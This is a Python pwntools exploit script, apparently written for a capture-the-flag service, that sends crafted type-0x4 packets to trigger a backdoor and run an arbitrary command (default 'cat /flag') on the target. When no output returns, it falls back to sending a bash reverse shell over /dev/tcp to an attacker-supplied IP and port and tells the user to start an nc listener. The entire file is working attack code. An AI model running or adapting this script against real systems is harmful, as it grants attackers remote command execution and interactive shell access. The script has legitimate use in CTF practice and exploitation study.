from pwn import *
import argparse
import sys
import time

def send_packet(packet_type, length, value):
    return p32(packet_type) + p32(length) + value

def make_conn(host, port, run_local=False, elf_path=None, gdb=False):
    if run_local:
        if gdb and elf_path:
            return gdb.debug(elf_path)
        return process(elf_path) if elf_path else None
    else:
        return remote(host, int(port))

def recv_all(conn, timeout=2.0):
    out = b""
    t0 = time.time()
    while True:
        try:
            chunk = conn.recv(timeout=0.5)
            if not chunk:
                break
            out += chunk
            if time.time() - t0 > timeout:
                break
        except EOFError:
            break
        except Exception:
            if time.time() - t0 > timeout:
                break
    return out

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", "-H", default="127.0.0.1", help="target host")
    p.add_argument("--port", "-P", default="8080", help="target port")
    p.add_argument("--cmd", "-c", default="cat /flag", help="command to run on target (default: cat /flag)")
    p.add_argument("--reverse", "-r", action="store_true", help="force use reverse shell fallback")
    p.add_argument("--attacker", "-a", help="attacker ip:port for reverse shell, e.g. 10.0.0.5:4444")
    p.add_argument("--local", action="store_true", help="run local binary instead of remote (requires --elf)")
    p.add_argument("--elf", help="path to local elf (when using --local)")
    p.add_argument("--gdb", action="store_true", help="run under gdb (local only)")

    args = p.parse_args()
    if args.local:
        if not args.elf:
            print("[!] --local requires --elf <path>")
            sys.exit(1)
        conn = make_conn(args.host, args.port, run_local=True, elf_path=args.elf, gdb=args.gdb)
    else:
        conn = make_conn(args.host, args.port, run_local=False)

    if not conn:
        print("[!] Failed to create connection")
        sys.exit(1)
    echo_val = p32(0xDEADBEEF)
    for i in range(3):
        pkt = send_packet(0x4, 4, echo_val)
        conn.send(pkt)
        time.sleep(0.1)
    cmd = args.cmd
    print(f"[+] Sending command packet: {cmd!r}")
    backdoor_pkt = send_packet(0x4, len(cmd), cmd.encode())
    conn.send(backdoor_pkt)
    out = recv_all(conn, timeout=2.0)
    if out:
        try:
            print("[+] Received output:")
            print(out.decode(errors="replace"))
        except:
            print(repr(out))
        conn.close()
        return
    if args.reverse or args.attacker:
        if not args.attacker:
            print("[!] To use reverse-shell fallback, provide --attacker IP:PORT and start a listener (nc -lvnp PORT)")
            conn.close()
            return
        lhost, lport = args.attacker.split(":")
        reverse_cmd = f"/bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        print(f"[+] No direct output. Sending reverse-shell to {lhost}:{lport}. Start listener now (nc -lvnp {lport})")
        pkt2 = send_packet(0x4, len(reverse_cmd), reverse_cmd.encode())
        conn.send(pkt2)
        try:
            conn.close()
        except:
            pass
        return
    print("[!] No output received from command; try --reverse --attacker <IP:PORT> to get reverse shell.")
    conn.close()

if __name__ == "__main__":
    main()
